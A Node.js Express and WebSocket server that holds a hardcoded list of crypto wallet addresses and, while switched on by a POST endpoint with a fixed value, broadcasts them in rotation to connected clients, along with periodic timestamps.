const express = require('express');
const { Server, OPEN } = require('ws');
const cors = require('cors');

const wallets = [
  'vg3GLHJYEkqKEPGEAdLnkNzcApHSNKdLxS49yHxrVnD',
  '6xjf4RoiM2tJNtKADZuge51K8zXjKcfnLgcs8LdMNA2b',
  'DHSyzeZExM6fhkSnyFb4QKxo4GezTyMz1pTzBejvYCAv',
  '6pbmn2TxgCxxYi1K3Tagt89M2av4ee9fXzcCmeue8jM4',
  '2iyfhYvicuGDSCJyzPf7Wz8mYFN2mFNPvaBQ8XkotHAs',
  'FPAGCiXtCVa7tV7BpNHxey92xYHoGL2c8FGT2ikLrdi5',
  'En19Jr3k8bH2fn4k8tEnEDFgqe8rmH64YPp1LQraKqm6',
  '34JDRW3tPXap9j8uGRXskbuGjNFDmr1wF2AR6hD4aKX3',
  '8R1rBXAusVvbxcpE1jUrwi88gjCx2xXgJYRBo329DrA3',
  'DcoFGtHEZ7rrQdUgLE28f7wdqxAm2d6NqHVXHnBUzPhs',
  '7RRtNjZsDRQFkHqL18wdgyrX3LXpy6FhJudivqX7GxKh',
  '8Eoq8BahHLNiynGXZRdmZQvV3easGK4L2Py8uvNJEUJn',
  '7rBSeFUqkL4MRCs2x4RAaSN55hoqBQHxast9NjwZ3Xf8',
  'Fk5UccM2PEwDBfsVGcuSxyheken2sr7Py8jAoUJ3X6AH',
  '8aTrHp7Ng96Mwnb9GyecHZ8PzEwzY27xUhsVpuHWGC3',
  'A3dBPu7127XgSMnmXkCcxuAGbPeZQC14tiuuSNNHdsUW',
  '5Mod65KSdv89zh9bkzhkQ9TZxaCfBLCZNSAsDYmeqwhs',
  '8cv6C6nhideo6kn4DvKHAwZGDYKq6L92A4zz3JZKSJhF',
  '28EoMYdF8nN4iyT3mdUPeFV4R63HtdjYNc14qoMUkRBp',
  '2fmNbh7spVYgdtGzRSDEjnhrDg1kbVweYVSmkdyWXzsn',
  '6FUv4D63fkYQ3cNiNcvhG5Fv41pANmux5cLGtR3zfy5A',
  'D7GuiW5vhjyDjSgrirVmW6x2wXXaYuHoTei4J3heKz1n',
  'AYV77JA4ttEJ9RRkzN9fQKZvs31S8zDEDte5Lb8s2Ud1',
  'BY2gZvj7dTWSEqFwo6QJTNhTxTGzsuBQCp79xWvHTesB',
  '9w5XYmAMHmfCJpyEK3gPYNippNWC3twQdamseXPir8QD',
  'CzkJM64Bs1hSQ4L1RM7xNmvz8MuFsGisxNMdZhJt7M3N',
  '7RPRgM2zdCh1LE4ekwk1GZ5XiajkAQ3K7jSHFG71Gc1H',
  'CeAtrUKvm3oCjm1jyAe9o9HzNcqjwEoCQKqouR9UKXin',
  'Hmz9t2KyaKqydvcLNkjgza5neWVyJ2bCGDBEZLLFHTph',
  'AiBDqHUgAaXLpyywURp9Zo8f1dfZ64Q8FaLYKhU3e36Z',
  '9KKsGQgqs3TL6FPSVfHuNTrw4E6TGLrfjndNsuBSQEw3',
  '6L5y8UAeRDTKTpoPNSxJS2UNypZosB9S9Tkv2SU6czqA',
  '9G7QNiYt8MsHTwFDhAMR5S8GMYgamsEm9E1UmUzyvUco',
  '3rLtx1JaQWZZEk1DwbcezWb4tQqZ4jtfH6c9kLNfdUZP',
  '4iGokTdQSjRV4rd9ZDtapzvUYehKFw4yUe8TLmqV126j',
  '4iGokTdQSjRV4rd9ZDtapzvUYehKFw4yUe8TLmqV126j',
  '56GpYVu6U9J7uNM6kE6yzxFdxFjMj12TsFyyC7GL1Duk',
  '3AsRPc15dXncewjRrd2rKoEJwS6iFrn9wMcSjePBNjsg',
  '9P6h72suoJvc8W15cqQxE67R6YNR25dg2ZjifRudn98G',
  '2gjuxJyKVMTrUHtXSGTeARD6KbsC1yUWWYbEhgdof5Sp',
  '3PtTAXgCTVv8FGusERDN4248g2cR5BUBzBgwqxPisbww',
  'EoeTRAAkxGG8aCZuv1FSfRMiHkNqV9QNmffHzybF33cC',
  '7gd1uKrmUb1CVKfmevv4EjzXzp9vzLWD6EF983NpxEzz',
  '511XrsQrRJK83iQ2EkHSUEEatwmy6qSwVX5sz7WUZ4jM',
  '6ybDnTXpYHEXD9QNQiQxZ3uU8CNTrJ1qF16WmgVF6CG8',
  '2iY3n1T3AE9uzskxw28xoTHBbVBaX2UutCERs7j9kF3t',
  'GNBRALE9DGtDy6ShhNFaDhQoCm5cLBqnS1LvEc4Krkp2',
  '5Pa82utCEuF7zzhMzVRN1JpnmgcywnKm3gmvppxa2Nck',
  '3SMbYiGWexafkChLjqXzAdevfGgevfJZ9pFaQgYSjcrA',
  'FaPqphvTwm8ZKBNQczfjSPpbG3bdxgneHUBMe6KB2K5F',
  '3LX5TK8GC5zZuZrewZxnKv4ASovUhwugVhMmkzsu9A9c',
  'vg3GLHJYEkqKEPGEAdLnkNzcApHSNKdLxS49yHxrVnD',
  '6xjf4RoiM2tJNtKADZuge51K8zXjKcfnLgcs8LdMNA2b',
  'DHSyzeZExM6fhkSnyFb4QKxo4GezTyMz1pTzBejvYCAv',
  '6pbmn2TxgCxxYi1K3Tagt89M2av4ee9fXzcCmeue8jM4',
  '2iyfhYvicuGDSCJyzPf7Wz8mYFN2mFNPvaBQ8XkotHAs',
  'FPAGCiXtCVa7tV7BpNHxey92xYHoGL2c8FGT2ikLrdi5',
  'En19Jr3k8bH2fn4k8tEnEDFgqe8rmH64YPp1LQraKqm6',
  '34JDRW3tPXap9j8uGRXskbuGjNFDmr1wF2AR6hD4aKX3',
  '8R1rBXAusVvbxcpE1jUrwi88gjCx2xXgJYRBo329DrA3',
  'DcoFGtHEZ7rrQdUgLE28f7wdqxAm2d6NqHVXHnBUzPhs',
  '7RRtNjZsDRQFkHqL18wdgyrX3LXpy6FhJudivqX7GxKh',
  '8Eoq8BahHLNiynGXZRdmZQvV3easGK4L2Py8uvNJEUJn',
  '7rBSeFUqkL4MRCs2x4RAaSN55hoqBQHxast9NjwZ3Xf8',
];

const PORT = process.env.PORT || 3000;
const INDEX = '/index.html';
// const IDLE_TIMEOUT_MS = 30000;  // Close idle connections after 30 seconds
const WALLET_BROADCAST_INTERVAL = 500;
const SEND_DATE_INTERVAL = 10000;

const app = express();
app.use(cors());
app.use(express.json());

const server = app.listen(PORT, () => console.log(`Listening on ${PORT}`));

const wss = new Server({ server });

// Store client connection metadata, such as last activity timestamp
// const clients = new Map();

let isBroadcastingMswa = false; // Flag to control whether to send mswa array
let walletIndex = 0; // Keep track of which wallet to send next

// Update message through POST request (Start sending mswa array)
app.post('/dd-idot', (req, res) => {
  const { mswa } = req.body;

  if (mswa === 'DD_IDOT') {
    isBroadcastingMswa = true;  // Start broadcasting mswa array
    res.send({ status: 'Started broadcasting mswa data' });
  } else {
    res.status(400).send({ status: 'Invalid mswa value' });
  }
});

// Stop sending mswa array
app.post('/dd-poel', (req, res) => {
  const { mswa } = req.body;

  if (mswa === 'DD_POEL') {
    isBroadcastingMswa = false;  // Stop broadcasting mswa array
    res.send({ status: 'Stopped broadcasting mswa data' });
  } else {
    res.status(400).send({ status: 'Invalid mswa value' });
  }
});

// Serve index.html
app.use((req, res) => res.sendFile(INDEX, { root: __dirname }));

// Handle WebSocket connection
wss.on('connection', (ws) => {
  // Store the connection with the current timestamp
  // const clientMeta = { lastActivity: Date.now() };
  // clients.set(ws, clientMeta);

  // Send the initial message upon connection
  ws.send(new Date().toTimeString());

  // If mswa broadcasting is active, start sending wallets to the new client
  if (isBroadcastingMswa) {
    sendNextWallet(ws); // Send next wallet to the new client immediately
  }

  // Set up ping-pong to detect dead connections
  ws.isAlive = true;
  ws.on('pong', () => {
    ws.isAlive = true;
    // clients.get(ws).lastActivity = Date.now();  // Update last activity timestamp
  });

  // Handle incoming messages (if any)
  ws.on('message', (message) => {
    // clientMeta.lastActivity = Date.now();  // Update last activity on message
    console.log(`Received message: ${message}`);
  });

  // Handle connection closure
  ws.on('close', () => {
    // clients.delete(ws);  // Remove client from the map
  });

  // Handle errors to prevent crashes
  ws.on('error', (err) => {
    console.error('WebSocket error:', err);
    ws.terminate();
  });
});

// Send the next wallet from the array to a specific client
const sendNextWallet = (ws) => {
  if (ws.readyState === OPEN) {
    ws.send(JSON.stringify({ mswa: wallets[walletIndex] }));
  }
  walletIndex = (walletIndex + 1) % wallets.length; // Loop back to start after the last wallet
};

// Broadcast mswa array if broadcasting is enabled
setInterval(() => {
  if (isBroadcastingMswa && wallets.length > 0) {
    // Send the next wallet from the array to all clients
    wss.clients.forEach((client) => {
      if (client.readyState === OPEN) {
        sendNextWallet(client);
      }
    });
  }
}, WALLET_BROADCAST_INTERVAL);

// Periodically send the current time to all connected clients
setInterval(() => {
  wss.clients.forEach((client) => {
    if (client.readyState === OPEN) {
      client.send(new Date().toTimeString());  // Send time to all connected clients
    }
  });
}, SEND_DATE_INTERVAL);

// // Clean up idle connections and implement heartbeat
// const cleanUpConnections = setInterval(() => {
//   wss.clients.forEach((ws) => {
//     if (!ws.isAlive) {
//       return ws.terminate();  // Close dead connections
//     }
//
//     ws.isAlive = false;
//     ws.ping();  // Send ping, expecting a pong response
//
//     // Close connections that have been idle for too long
//     const clientMeta = clients.get(ws);
//     if (clientMeta && Date.now() - clientMeta.lastActivity > IDLE_TIMEOUT_MS) {
//       ws.terminate();
//     }
//   });
// }, 15000);  // Run cleanup every 10 seconds

// Gracefully handle server shutdown
// process.on('SIGINT', () => {
//   console.log("Shutting down server...");
//   clearInterval(cleanUpConnections);  // Stop the cleanup interval
//   clearInterval(broadcastMswa);       // Stop the mswa broadcasting interval
//   wss.clients.forEach((ws) => ws.terminate());  // Close all WebSocket connections
//   server.close(() => {
//     console.log("Server closed.");
//     process.exit(0);
//   });
// });
